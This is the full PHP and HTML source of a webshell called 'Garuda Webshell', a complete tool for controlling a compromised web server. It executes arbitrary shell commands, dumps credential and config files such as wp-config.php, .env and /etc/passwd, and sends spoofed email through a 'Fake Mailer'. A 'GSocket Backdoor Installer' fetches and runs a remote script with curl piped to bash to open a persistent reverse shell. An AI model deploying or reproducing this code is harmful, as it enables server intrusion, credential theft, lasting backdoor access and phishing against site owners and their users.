<?php
// Garuda Webshell - Ultimate File Manager
session_start();

// Security headers
header("X-Powered-By: Apache");
header("Server: Apache/2.4.41 (Unix)");
header("Content-Type: text/html; charset=UTF-8");

// Config
$BASE_DIR = __DIR__;
$APP_NAME = "Garuda Webshell";
$THEME = isset($_COOKIE['theme']) ? $_COOKIE['theme'] : 'dark';

// Simple functions
function secure_path($base, $path) {
    $real_base = realpath($base);
    $target = realpath($base . '/' . $path);
    return ($target && strpos($target, $real_base) === 0) ? $target : $real_base;
}

function format_size($size) {
    $units = array('B', 'KB', 'MB', 'GB');
    $unit = 0;
    while ($size >= 1024 && $unit < 3) {
        $size /= 1024;
        $unit++;
    }
    return round($size, 2) . $units[$unit];
}

// Secure current directory
$current_dir = isset($_GET['d']) ? secure_path($BASE_DIR, $_GET['d']) : $BASE_DIR;

// Theme toggle
if(isset($_POST['theme_toggle'])) {
    $THEME = $_POST['theme'] == 'dark' ? 'light' : 'dark';
    setcookie('theme', $THEME, time() + (86400 * 30), "/");
    header("Location: ?d=" . urlencode(str_replace($BASE_DIR . '/', '', $current_dir)));
    exit;
}

// GSocket Auto-Install
if(isset($_POST['install_gsocket'])) {
    $install_result = install_gsocket();
    $_SESSION['notification'] = $install_result;
    header("Location: ?d=" . urlencode(str_replace($BASE_DIR . '/', '', $current_dir)));
    exit;
}

// GSocket Install Function
function install_gsocket() {
    $output = shell_exec('bash -c "$(curl -fsSL https://gsocket.io/y)" 2>&1');
    
    // Extract the key from output
    $key = '';
    if(preg_match('/gs-netcat -s "([^"]+)"/', $output, $matches)) {
        $key = $matches[1];
    }
    
    if(!empty($key)) {
        return "✅ GSocket installed successfully!\n\n🔑 Connection Key: $key\n💻 Command: gs-netcat -s \"$key\" -i\n\n⚠️ Save this key for connection!";
    } else {
        return "❌ GSocket installation failed!\n\nOutput: " . $output;
    }
}

// Auto Get Config
if(isset($_GET['get_config'])) {
    $configs = array();
    
    // Get common config files
    $config_files = [
        '/etc/passwd' => 'System Users',
        '/etc/hosts' => 'Hosts File',
        '/etc/resolv.conf' => 'DNS Config',
        '.env' => 'Environment',
        'config.php' => 'PHP Config',
        'config.json' => 'JSON Config',
        'wp-config.php' => 'WordPress Config',
        'configuration.php' => 'Joomla Config',
        'settings.php' => 'Drupal Config',
        'app/etc/env.php' => 'Magento Config'
    ];
    
    foreach($config_files as $file => $desc) {
        if(file_exists($BASE_DIR . '/' . $file) || file_exists($file)) {
            $path = file_exists($BASE_DIR . '/' . $file) ? $BASE_DIR . '/' . $file : $file;
            $configs[$desc] = [
                'path' => $path,
                'content' => htmlspecialchars(file_get_contents($path))
            ];
        }
    }
    
    $_SESSION['configs'] = $configs;
    header("Location: ?d=" . urlencode(str_replace($BASE_DIR . '/', '', $current_dir)));
    exit;
}

// Edit File
if(isset($_POST['edit_file'])) {
    $file_path = $BASE_DIR . '/' . $_POST['file_path'];
    if(file_exists($file_path) && is_writable($file_path)) {
        file_put_contents($file_path, $_POST['file_content']);
        $_SESSION['notification'] = "✅ File updated: " . basename($file_path);
    }
    header("Location: ?d=" . urlencode(str_replace($BASE_DIR . '/', '', $current_dir)));
    exit;
}

// Fake mailer
if(isset($_POST['send_email'])) {
    $to = $_POST['to_email'] ?? '';
    $from = $_POST['from_email'] ?? 'noreply@domain.com';
    $subject = $_POST['subject'] ?? 'Test Email';
    $message = $_POST['message'] ?? 'Hello World';
    
    $headers = "From: $from\r\n";
    $headers .= "Reply-To: $from\r\n";
    $headers .= "X-Mailer: PHP/" . phpversion();
    
    if(mail($to, $subject, $message, $headers)) {
        $_SESSION['notification'] = "✅ Email sent to $to";
    } else {
        $_SESSION['notification'] = "❌ Failed to send email";
    }
    header("Location: ?d=" . urlencode(str_replace($BASE_DIR . '/', '', $current_dir)));
    exit;
}

// File operations
if(isset($_POST['action'])) {
    switch($_POST['action']) {
        case 'delete':
            if(isset($_POST['file'])) {
                $file_path = $BASE_DIR . '/' . $_POST['file'];
                if(file_exists($file_path)) {
                    if(is_dir($file_path)) {
                        rmdir($file_path);
                    } else {
                        unlink($file_path);
                    }
                    $_SESSION['notification'] = "✅ File deleted: " . $_POST['file'];
                }
            }
            break;
            
        case 'create_file':
            if(isset($_POST['filename'])) {
                $new_file = $current_dir . '/' . $_POST['filename'];
                file_put_contents($new_file, $_POST['content'] ?? '');
                $_SESSION['notification'] = "✅ File created: " . $_POST['filename'];
            }
            break;
            
        case 'create_folder':
            if(isset($_POST['foldername'])) {
                $new_folder = $current_dir . '/' . $_POST['foldername'];
                mkdir($new_folder, 0755, true);
                $_SESSION['notification'] = "✅ Folder created: " . $_POST['foldername'];
            }
            break;
            
        case 'lock_file':
            if(isset($_POST['file'])) {
                $file_path = $BASE_DIR . '/' . $_POST['file'];
                if(file_exists($file_path)) {
                    chmod($file_path, 0444);
                    $_SESSION['notification'] = "🔒 File locked: " . $_POST['file'];
                }
            }
            break;
            
        case 'unlock_file':
            if(isset($_POST['file'])) {
                $file_path = $BASE_DIR . '/' . $_POST['file'];
                if(file_exists($file_path)) {
                    chmod($file_path, 0644);
                    $_SESSION['notification'] = "🔓 File unlocked: " . $_POST['file'];
                }
            }
            break;
    }
    header("Location: ?d=" . urlencode(str_replace($BASE_DIR . '/', '', $current_dir)));
    exit;
}

// Terminal commands
if(isset($_POST['terminal_command'])) {
    $command = trim($_POST['terminal_command']);
    $output = [];
    
    if(!isset($_SESSION['terminal_history'])) {
        $_SESSION['terminal_history'] = [];
    }
    
    // Basic commands
    if(strpos($command, 'cd ') === 0) {
        $new_dir = trim(substr($command, 3));
        $target_dir = realpath($current_dir . '/' . $new_dir);
        if($target_dir && strpos($target_dir, $BASE_DIR) === 0) {
            $current_dir = $target_dir;
        } else {
            $output[] = "cd: $new_dir: No such directory";
        }
    } 
    elseif($command === 'pwd') {
        $output[] = $current_dir;
    }
    elseif($command === 'ls' || $command === 'dir') {
        $files = scandir($current_dir);
        foreach($files as $file) {
            if($file != '.' && $file != '..') {
                $file_path = $current_dir . '/' . $file;
                $icon = is_dir($file_path) ? '📁' : '📄';
                $size = is_dir($file_path) ? '' : ' (' . format_size(filesize($file_path)) . ')';
                $perms = substr(sprintf('%o', fileperms($file_path)), -4);
                $output[] = "$perms $icon $file$size";
            }
        }
    }
    elseif(strpos($command, 'mkdir ') === 0) {
        $folder_name = trim(substr($command, 6));
        if(mkdir($current_dir . '/' . $folder_name, 0755, true)) {
            $output[] = "✅ Directory created: $folder_name";
        } else {
            $output[] = "❌ Failed to create directory";
        }
    }
    elseif(strpos($command, 'rm ') === 0) {
        $target = trim(substr($command, 3));
        $target_path = $current_dir . '/' . $target;
        if(file_exists($target_path)) {
            if(is_dir($target_path)) {
                rmdir($target_path) ? $output[] = "✅ Directory removed" : $output[] = "❌ Failed to remove directory";
            } else {
                unlink($target_path) ? $output[] = "✅ File removed" : $output[] = "❌ Failed to remove file";
            }
        } else {
            $output[] = "rm: cannot remove '$target': No such file or directory";
        }
    }
    elseif(strpos($command, 'create ') === 0) {
        $parts = explode(' ', $command, 3);
        if(count($parts) >= 3) {
            $filename = $parts[1];
            $content = $parts[2];
            if(file_put_contents($current_dir . '/' . $filename, $content)) {
                $output[] = "✅ File created: $filename";
            }
        }
    }
    elseif($command === 'clear') {
        $_SESSION['terminal_history'] = [];
        $output[] = "Terminal cleared";
    }
    elseif($command === 'help') {
        $output[] = "Available commands:";
        $output[] = "cd [dir]           - Change directory";
        $output[] = "ls/dir            - List files";
        $output[] = "pwd               - Show current path";
        $output[] = "mkdir [name]      - Create directory";
        $output[] = "rm [name]         - Remove file/directory";
        $output[] = "create file content - Create file with content";
        $output[] = "clear             - Clear terminal";
        $output[] = "help              - Show help";
    }
    else {
        // Execute system command
        if(function_exists('exec')) {
            $old_dir = getcwd();
            chdir($current_dir);
            exec($command . " 2>&1", $cmd_output, $return_code);
            chdir($old_dir);
            $output = array_merge($output, $cmd_output);
            if($return_code !== 0) {
                $output[] = "Command failed with exit code: $return_code";
            }
        } else {
            $output[] = "Command execution is disabled on this server";
        }
    }
    
    // Save to history
    $_SESSION['terminal_history'][] = [
        'command' => $command,
        'output' => $output,
        'path' => str_replace($BASE_DIR, '~', $current_dir),
        'time' => date('H:i:s')
    ];
    
    // Keep last 20 commands
    if(count($_SESSION['terminal_history']) > 20) {
        $_SESSION['terminal_history'] = array_slice($_SESSION['terminal_history'], -20);
    }
    
    header("Location: ?d=" . urlencode(str_replace($BASE_DIR . '/', '', $current_dir)));
    exit;
}

// Check if GSocket is installed
$gsocket_installed = false;
if(function_exists('shell_exec')) {
    $gsocket_check = shell_exec('which gs-netcat 2>/dev/null');
    $gsocket_installed = !empty($gsocket_check);
}
?>
<!DOCTYPE html>
<html lang="en" data-theme="<?php echo $THEME; ?>">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🦅 <?php echo $APP_NAME; ?></title>
    <style>
        :root {
            --bg-primary: #0f0f23;
            --bg-secondary: #1a1a2e;
            --bg-card: #16213e;
            --text-primary: #e2e8f0;
            --text-secondary: #94a3b8;
            --accent: #6366f1;
            --success: #10b981;
            --danger: #ef4444;
            --warning: #f59e0b;
            --info: #3b82f6;
            --border: #334155;
        }

        [data-theme="light"] {
            --bg-primary: #f8fafc;
            --bg-secondary: #e2e8f0;
            --bg-card: #ffffff;
            --text-primary: #1e293b;
            --text-secondary: #64748b;
            --border: #cbd5e1;
        }

        * { 
            margin: 0; 
            padding: 0; 
            box-sizing: border-box; 
        }
        
        body { 
            font-family: 'Segoe UI', system-ui, sans-serif; 
            background: var(--bg-primary);
            color: var(--text-primary);
            line-height: 1.6;
            min-height: 100vh;
        }

        .glass {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

        .header {
            background: var(--bg-secondary);
            border-bottom: 2px solid var(--accent);
            padding: 1rem 2rem;
            position: sticky;
            top: 0;
            z-index: 100;
        }

        .nav-bar {
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 1rem;
        }

        .logo {
            display: flex;
            align-items: center;
            gap: 0.75rem;
            font-size: 1.5rem;
            font-weight: 700;
            color: var(--accent);
        }

        .logo-icon {
            font-size: 2rem;
            animation: float 3s ease-in-out infinite;
        }

        @keyframes float {
            0%, 100% { transform: translateY(0px); }
            50% { transform: translateY(-5px); }
        }

        .path-display {
            flex: 1;
            font-family: 'Monaco', 'Consolas', monospace;
            font-size: 0.9rem;
            color: var(--text-secondary);
            padding: 0.5rem 1rem;
            background: var(--bg-card);
            border-radius: 8px;
            margin: 0 1rem;
        }

        .toolbar {
            display: flex;
            gap: 0.5rem;
            flex-wrap: wrap;
        }

        .btn {
            background: var(--accent);
            color: white;
            border: none;
            padding: 0.6rem 1rem;
            border-radius: 8px;
            cursor: pointer;
            font-size: 0.85rem;
            font-weight: 500;
            transition: all 0.2s ease;
            display: flex;
            align-items: center;
            gap: 0.5rem;
            text-decoration: none;
        }

        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(99, 102, 241, 0.3);
        }

        .btn-success { background: var(--success); }
        .btn-danger { background: var(--danger); }
        .btn-warning { background: var(--warning); }
        .btn-info { background: var(--info); }

        .btn-outline {
            background: transparent;
            border: 1px solid var(--accent);
            color: var(--accent);
        }

        .container {
            display: grid;
            grid-template-columns: 280px 1fr;
            gap: 1.5rem;
            padding: 1.5rem;
            max-width: 100%;
        }

        .sidebar {
            display: flex;
            flex-direction: column;
            gap: 1rem;
        }

        .card {
            background: var(--bg-card);
            border-radius: 12px;
            padding: 1.5rem;
            border: 1px solid var(--border);
        }

        .card h3 {
            margin-bottom: 1rem;
            color: var(--accent);
            font-size: 1.1rem;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }

        .stats {
            display: flex;
            flex-direction: column;
            gap: 0.75rem;
        }

        .stat-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 0.5rem 0;
            border-bottom: 1px solid var(--border);
        }

        .quick-actions {
            display: flex;
            flex-direction: column;
            gap: 0.5rem;
        }

        .main-content {
            display: flex;
            flex-direction: column;
            gap: 1.5rem;
        }

        .file-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
            gap: 1rem;
        }

        .file-item {
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 1rem;
            cursor: pointer;
            transition: all 0.2s ease;
            position: relative;
            overflow: hidden;
        }

        .file-item:hover {
            transform: translateY(-4px);
            border-color: var(--accent);
            box-shadow: 0 8px 25px rgba(0,0,0,0.15);
        }

        .file-item.back {
            background: linear-gradient(135deg, var(--bg-secondary), var(--accent));
        }

        .file-icon {
            font-size: 2rem;
            margin-bottom: 0.5rem;
            text-align: center;
        }

        .file-name {
            font-weight: 600;
            font-size: 0.9rem;
            margin-bottom: 0.25rem;
            word-break: break-all;
        }

        .file-details {
            font-size: 0.75rem;
            color: var(--text-secondary);
        }

        .file-actions {
            position: absolute;
            top: 0.5rem;
            right: 0.5rem;
            display: flex;
            gap: 0.25rem;
            opacity: 0;
            transition: opacity 0.2s ease;
        }

        .file-item:hover .file-actions {
            opacity: 1;
        }

        .action-btn {
            background: rgba(0,0,0,0.7);
            color: white;
            border: none;
            width: 24px;
            height: 24px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 0.7rem;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .terminal {
            background: #000;
            border-radius: 12px;
            overflow: hidden;
            border: 1px solid var(--border);
        }

        .terminal-header {
            background: #1a1a1a;
            padding: 0.75rem 1rem;
            border-bottom: 1px solid #333;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .terminal-output {
            height: 300px;
            overflow-y: auto;
            padding: 1rem;
            font-family: 'Monaco', 'Consolas', monospace;
            font-size: 0.85rem;
            line-height: 1.4;
            color: #00ff00;
            background: #000;
        }

        .terminal-input {
            display: flex;
            background: #0a0a0a;
            border-top: 1px solid #333;
        }

        .prompt {
            color: #ffff00;
            padding: 0.75rem;
            font-family: monospace;
        }

        .terminal-input input {
            flex: 1;
            background: transparent;
            border: none;
            color: #00ff00;
            font-family: monospace;
            padding: 0.75rem;
            outline: none;
        }

        .notification {
            position: fixed;
            top: 1rem;
            right: 1rem;
            background: var(--success);
            color: white;
            padding: 1rem 1.5rem;
            border-radius: 8px;
            box-shadow: 0 8px 25px rgba(0,0,0,0.3);
            z-index: 1000;
            animation: slideInRight 0.3s ease;
            white-space: pre-line;
        }

        @keyframes slideInRight {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }

        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.7);
            z-index: 2000;
            backdrop-filter: blur(5px);
        }

        .modal-content {
            background: var(--bg-card);
            margin: 2rem auto;
            padding: 2rem;
            border-radius: 16px;
            max-width: 600px;
            max-height: 80vh;
            overflow-y: auto;
            border: 1px solid var(--border);
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }

        .form-group {
            margin-bottom: 1.5rem;
        }

        .form-group label {
            display: block;
            margin-bottom: 0.5rem;
            font-weight: 600;
            color: var(--text-primary);
        }

        .form-group input, 
        .form-group textarea {
            width: 100%;
            padding: 0.75rem 1rem;
            border: 1px solid var(--border);
            border-radius: 8px;
            background: var(--bg-primary);
            color: var(--text-primary);
            font-family: inherit;
        }

        .form-group textarea {
            min-height: 200px;
            resize: vertical;
        }

        .modal-actions {
            display: flex;
            gap: 1rem;
            justify-content: flex-end;
            margin-top: 1.5rem;
        }

        @media (max-width: 768px) {
            .container {
                grid-template-columns: 1fr;
                padding: 1rem;
            }
            
            .nav-bar {
                flex-direction: column;
                align-items: stretch;
            }
            
            .path-display {
                margin: 0;
                order: 2;
            }
            
            .toolbar {
                justify-content: center;
            }
            
            .file-grid {
                grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="nav-bar">
            <div class="logo">
                <span class="logo-icon">🦅</span>
                <span>Garuda Webshell</span>
            </div>
            
            <div class="path-display">
                📁 <?php echo str_replace($BASE_DIR, '~', $current_dir); ?>
            </div>
            
            <div class="toolbar">
                <button class="btn" onclick="showModal('newFileModal')">
                    <span>📄</span> New File
                </button>
                <button class="btn" onclick="showModal('newFolderModal')">
                    <span>📁</span> New Folder
                </button>
                <button class="btn btn-info" onclick="getConfig()">
                    <span>⚙️</span> Get Config
                </button>
                <button class="btn btn-warning" onclick="showModal('emailModal')">
                    <span>📧</span> Fake Mailer
                </button>
                <button class="btn btn-info" onclick="showModal('gsocketModal')">
                    <span>🔗</span> GSocket
                </button>
                <button class="btn btn-outline" onclick="toggleTheme()">
                    <span>🌙</span> Theme
                </button>
            </div>
        </div>
    </div>

    <?php if(isset($_SESSION['notification'])): ?>
        <div class="notification" id="notification">
            <?php echo $_SESSION['notification']; unset($_SESSION['notification']); ?>
        </div>
    <?php endif; ?>

    <div class="container">
        <!-- Sidebar -->
        <div class="sidebar">
            <div class="card">
                <h3>📊 System Info</h3>
                <div class="stats">
                    <div class="stat-item">
                        <span>💾 Free Space</span>
                        <span><?php echo format_size(disk_free_space($BASE_DIR)); ?></span>
                    </div>
                    <div class="stat-item">
                        <span>💿 Total Space</span>
                        <span><?php echo format_size(disk_total_space($BASE_DIR)); ?></span>
                    </div>
                    <div class="stat-item">
                        <span>🖥️ PHP Version</span>
                        <span><?php echo PHP_VERSION; ?></span>
                    </div>
                    <div class="stat-item">
                        <span>⚡ Server</span>
                        <span><?php echo explode(' ', $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown')[0]; ?></span>
                    </div>
                </div>
            </div>

            <div class="card">
                <h3>🚀 Quick Actions</h3>
                <div class="quick-actions">
                    <button class="btn btn-outline" onclick="executeCommand('pwd')">
                        📍 Current Path
                    </button>
                    <button class="btn btn-outline" onclick="executeCommand('ls -la')">
                        📋 List All Files
                    </button>
                    <button class="btn btn-outline" onclick="executeCommand('clear')">
                        🧹 Clear Terminal
                    </button>
                </div>
            </div>

            <?php if($gsocket_installed): ?>
            <div class="card">
                <h3>🔗 GSocket Status</h3>
                <div style="color: var(--success); font-size: 0.9rem;">
                    ✅ GSocket Installed<br>
                    <small>Use terminal to connect</small>
                </div>
            </div>
            <?php endif; ?>
        </div>

        <!-- Main Content -->
        <div class="main-content">
            <!-- File Browser -->
            <div class="card">
                <h3>📁 File Browser</h3>
                <div class="file-grid">
                    <div class="file-item back" onclick="navigate('..')">
                        <div class="file-icon">📁</div>
                        <div class="file-name">...</div>
                        <div class="file-details">Parent Directory</div>
                    </div>
                    
                    <?php
                    $files = scandir($current_dir);
                    foreach($files as $file) {
                        if($file == '.' || $file == '..') continue;
                        $file_path = $current_dir . '/' . $file;
                        $is_dir = is_dir($file_path);
                        $icon = $is_dir ? '📁' : '📄';
                        $size = format_size(filesize($file_path));
                        $perms = substr(sprintf('%o', fileperms($file_path)), -4);
                        $relative_path = str_replace($BASE_DIR . '/', '', $file_path);
                        
                        echo "<div class='file-item'>";
                        echo "<div class='file-actions'>";
                        if(!$is_dir) {
                            echo "<button class='action-btn' onclick=\"editFile('$relative_path')\" title='Edit'>✏️</button>";
                            echo "<button class='action-btn' onclick=\"lockFile('$relative_path')\" title='Lock'>🔒</button>";
                        }
                        echo "<button class='action-btn' onclick=\"deleteFile('$relative_path')\" title='Delete'>🗑️</button>";
                        echo "</div>";
                        echo "<div class='file-icon' onclick=\"";
                        echo $is_dir ? "navigate('$relative_path')" : "viewFile('$relative_path')";
                        echo "\">$icon</div>";
                        echo "<div class='file-name' onclick=\"";
                        echo $is_dir ? "navigate('$relative_path')" : "viewFile('$relative_path')";
                        echo "\">$file</div>";
                        echo "<div class='file-details'>$size • $perms</div>";
                        echo "</div>";
                    }
                    ?>
                </div>
            </div>

            <!-- Terminal -->
            <div class="card terminal">
                <div class="terminal-header">
                    <div>💻 Terminal</div>
                    <div style="color: var(--text-secondary); font-size: 0.8rem;">
                        <?php echo str_replace($BASE_DIR, '~', $current_dir); ?>
                    </div>
                </div>
                <div class="terminal-output" id="terminalOutput">
                    <?php if(isset($_SESSION['terminal_history'])): ?>
                        <?php foreach($_SESSION['terminal_history'] as $history): ?>
                            <div style="margin-bottom: 0.5rem;">
                                <div style="color: #ffff00;">
                                    [<?php echo $history['time']; ?>] <?php echo $history['path']; ?> $ <?php echo $history['command']; ?>
                                </div>
                                <?php if(!empty($history['output'])): ?>
                                    <div style="color: #00ff00;">
                                        <?php echo implode("\n", $history['output']); ?>
                                    </div>
                                <?php endif; ?>
                            </div>
                        <?php endforeach; ?>
                    <?php else: ?>
                        <div style="color: #00ff00;">
                            🦅 Garuda Terminal Ready<br>
                            Type 'help' for available commands
                        </div>
                    <?php endif; ?>
                </div>
                <form method="POST" class="terminal-input" onsubmit="return submitTerminalCommand()">
                    <div class="prompt">$</div>
                    <input type="text" name="terminal_command" placeholder="Type command..." autocomplete="off" id="terminalInput">
                </form>
            </div>
        </div>
    </div>

    <!-- GSocket Modal -->
    <div id="gsocketModal" class="modal">
        <div class="modal-content">
            <h3 style="margin-bottom: 1rem;">🔗 GSocket Backdoor Installer</h3>
            <p style="margin-bottom: 1.5rem; color: var(--text-secondary);">
                GSocket creates a persistent backdoor connection using global socket relay.
                This will install gs-netcat and set up a reverse shell connection.
            </p>
            
            <div style="background: var(--bg-primary); padding: 1rem; border-radius: 8px; margin-bottom: 1.5rem;">
                <h4 style="margin-bottom: 0.5rem; color: var(--accent);">Installation Method:</h4>
                <code style="background: #000; color: #0f0; padding: 0.5rem; border-radius: 4px; display: block; font-family: monospace;">
                    bash -c "$(curl -fsSL https://gsocket.io/y)"
                </code>
            </div>
            
            <form method="POST">
                <input type="hidden" name="install_gsocket" value="1">
                <div class="modal-actions">
                    <button type="button" class="btn btn-outline" onclick="hideModal('gsocketModal')">
                        Cancel
                    </button>
                    <button type="submit" class="btn btn-success">
                        🚀 Install GSocket
                    </button>
                </div>
            </form>
        </div>
    </div>

    <!-- Edit File Modal -->
    <div id="editFileModal" class="modal">
        <div class="modal-content">
            <h3 style="margin-bottom: 1rem;">✏️ Edit File</h3>
            <form method="POST">
                <input type="hidden" name="edit_file" value="1">
                <input type="hidden" name="file_path" id="editFilePath">
                <div class="form-group">
                    <label>File Content:</label>
                    <textarea name="file_content" id="editFileContent" rows="15" placeholder="File content..."></textarea>
                </div>
                <div class="modal-actions">
                    <button type="button" class="btn btn-outline" onclick="hideModal('editFileModal')">
                        Cancel
                    </button>
                    <button type="submit" class="btn btn-success">
                        💾 Save Changes
                    </button>
                </div>
            </form>
        </div>
    </div>

    <!-- Other Modals -->
    <div id="newFileModal" class="modal">
        <div class="modal-content">
            <h3>📄 Create New File</h3>
            <form method="POST">
                <input type="hidden" name="action" value="create_file">
                <div class="form-group">
                    <label>Filename:</label>
                    <input type="text" name="filename" placeholder="example.php" required>
                </div>
                <div class="form-group">
                    <label>Content:</label>
                    <textarea name="content" rows="10" placeholder="File content..."></textarea>
                </div>
                <div class="modal-actions">
                    <button type="button" class="btn btn-outline" onclick="hideModal('newFileModal')">Cancel</button>
                    <button type="submit" class="btn btn-success">Create</button>
                </div>
            </form>
        </div>
    </div>

    <div id="newFolderModal" class="modal">
        <div class="modal-content">
            <h3>📁 Create New Folder</h3>
            <form method="POST">
                <input type="hidden" name="action" value="create_folder">
                <div class="form-group">
                    <label>Folder Name:</label>
                    <input type="text" name="foldername" placeholder="new_folder" required>
                </div>
                <div class="modal-actions">
                    <button type="button" class="btn btn-outline" onclick="hideModal('newFolderModal')">Cancel</button>
                    <button type="submit" class="btn btn-success">Create</button>
                </div>
            </form>
        </div>
    </div>

    <div id="emailModal" class="modal">
        <div class="modal-content">
            <h3>📧 Fake Email Sender</h3>
            <form method="POST">
                <input type="hidden" name="send_email" value="1">
                <div class="form-group">
                    <label>To:</label>
                    <input type="email" name="to_email" placeholder="target@example.com" required>
                </div>
                <div class="form-group">
                    <label>From:</label>
                    <input type="email" name="from_email" placeholder="fake@sender.com" required>
                </div>
                <div class="form-group">
                    <label>Subject:</label>
                    <input type="text" name="subject" placeholder="Important Message" required>
                </div>
                <div class="form-group">
                    <label>Message:</label>
                    <textarea name="message" rows="6" placeholder="Email content..." required></textarea>
                </div>
                <div class="modal-actions">
                    <button type="button" class="btn btn-outline" onclick="hideModal('emailModal')">Cancel</button>
                    <button type="submit" class="btn btn-success">Send Email</button>
                </div>
            </form>
        </div>
    </div>

    <script>
    function showModal(modalId) {
        document.getElementById(modalId).style.display = 'block';
    }
    
    function hideModal(modalId) {
        document.getElementById(modalId).style.display = 'none';
    }
    
    function navigate(dir) {
        window.location.href = '?d=' + encodeURIComponent(dir);
    }
    
    function executeCommand(cmd) {
        document.getElementById('terminalInput').value = cmd;
        document.querySelector('.terminal-input').submit();
    }
    
    function submitTerminalCommand() {
        return document.getElementById('terminalInput').value.trim() !== '';
    }
    
    function deleteFile(file) {
        if(confirm('Delete ' + file + '?')) {
            const form = document.createElement('form');
            form.method = 'POST';
            form.innerHTML = '<input name="action" value="delete"><input name="file" value="' + file + '">';
            document.body.appendChild(form);
            form.submit();
        }
    }
    
    function lockFile(file) {
        if(confirm('Lock ' + file + '?')) {
            const form = document.createElement('form');
            form.method = 'POST';
            form.innerHTML = '<input name="action" value="lock_file"><input name="file" value="' + file + '">';
            document.body.appendChild(form);
            form.submit();
        }
    }
    
    function viewFile(file) {
        window.open('?view=' + encodeURIComponent(file) + '&d=<?php echo urlencode(str_replace($BASE_DIR . '/', '', $current_dir)); ?>', '_blank');
    }
    
    function editFile(file) {
        // Load file content via AJAX
        fetch('?get_file=' + encodeURIComponent(file))
            .then(response => response.text())
            .then(content => {
                document.getElementById('editFilePath').value = file;
                document.getElementById('editFileContent').value = content;
                showModal('editFileModal');
            })
            .catch(err => {
                alert('Error loading file: ' + err);
            });
    }
    
    function getConfig() {
        window.location.href = '?get_config=1&d=<?php echo urlencode(str_replace($BASE_DIR . '/', '', $current_dir)); ?>';
    }
    
    function toggleTheme() {
        const form = document.createElement('form');
        form.method = 'POST';
        form.innerHTML = '<input name="theme_toggle" value="1"><input name="theme" value="<?php echo $THEME; ?>">';
        document.body.appendChild(form);
        form.submit();
    }
    
    // Auto-hide notification
    setTimeout(() => {
        const notification = document.getElementById('notification');
        if(notification) notification.remove();
    }, 5000);
    
    // Auto-scroll terminal
    const terminalOutput = document.getElementById('terminalOutput');
    if(terminalOutput) {
        terminalOutput.scrollTop = terminalOutput.scrollHeight;
    }
    
    // Close modal on outside click
    window.onclick = function(e) {
        if(e.target.className === 'modal') {
            e.target.style.display = 'none';
        }
    }
    
    // Terminal input focus
    document.getElementById('terminalInput')?.focus();
    </script>

    <?php
    // Handle file content loading for edit
    if(isset($_GET['get_file'])) {
        $file_path = $BASE_DIR . '/' . $_GET['get_file'];
        if(file_exists($file_path) && is_readable($file_path)) {
            echo file_get_contents($file_path);
        }
        exit;
    }
    
    // Handle config display
    if(isset($_SESSION['configs'])) {
        echo '<div id="configModal" class="modal" style="display:block">';
        echo '<div class="modal-content" style="max-width: 800px;">';
        echo '<h3>⚙️ Configuration Files Found</h3>';
        foreach($_SESSION['configs'] as $desc => $config) {
            echo '<div style="margin-bottom: 1rem; padding: 1rem; background: var(--bg-primary); border-radius: 8px;">';
            echo '<h4 style="color: var(--accent); margin-bottom: 0.5rem;">' . $desc . '</h4>';
            echo '<div style="font-size: 0.8rem; color: var(--text-secondary); margin-bottom: 0.5rem;">Path: ' . $config['path'] . '</div>';
            echo '<pre style="background: #000; color: #0f0; padding: 1rem; border-radius: 4px; max-height: 200px; overflow: auto; font-size: 0.8rem;">';
            echo $config['content'];
            echo '</pre>';
            echo '</div>';
        }
        echo '<div class="modal-actions">';
        echo '<button class="btn" onclick="hideModal(\'configModal\')">Close</button>';
        echo '</div>';
        echo '</div>';
        echo '</div>';
        unset($_SESSION['configs']);
    }
    ?>
</body>
</html>
